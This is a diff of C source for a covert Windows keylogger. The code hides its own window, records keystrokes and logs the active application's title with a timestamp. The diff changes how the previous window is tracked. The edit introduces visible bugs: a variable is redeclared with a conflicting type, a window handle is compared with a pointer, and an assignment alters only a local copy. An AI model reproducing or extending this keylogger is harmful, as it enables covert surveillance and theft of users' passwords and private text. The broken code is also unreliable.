@@ -8,13 +8,14 @@
 
 // FUNCTION DECLARATIONS //
 void HideWindow();
-void GetCurrentApplication(char *prev_window, FILE* logfile);
+void GetCurrentApplication(HWND *prev_window, FILE* logfile);
 void KeystrokeHandler(short key, FILE* logfile);
 
 // MAIN FUNCTION //
 int main(){
     HideWindow();
     char prev_window[BUF_SIZE];
+    HWND prev_window;
 
     while(1){
 
@@ -51,17 +52,17 @@ void HideWindow(){
 }
 
 // finds the name of the current top-most window/application
-void GetCurrentApplication(char *prev_window, FILE* logfile){
+void GetCurrentApplication(HWND *prev_window, FILE* logfile){
     HWND foreground = GetForegroundWindow();
-    if (foreground){
+    if (foreground != prev_window){
+        prev_window = foreground;
+        
         char curr_window[BUF_SIZE];
         GetWindowText(foreground, curr_window, BUF_SIZE);
-        if(strcmp(curr_window, prev_window) != 0 && strcmp(curr_window,"")){
-            time_t curr_time = time(NULL);
-            char* curr_time_str = ctime(&curr_time);
-            strncpy(prev_window, curr_window, strlen(curr_window));
-            fprintf(logfile, "\nAPPLICATION: <%s> TIME: %s", curr_window, curr_time_str);
-        }
+        
+        time_t curr_time = time(NULL);
+        char* curr_time_str = ctime(&curr_time);
+        fprintf(logfile, "\nAPPLICATION: <%s> TIME: %s", curr_window, curr_time_str);
     }
 }
 
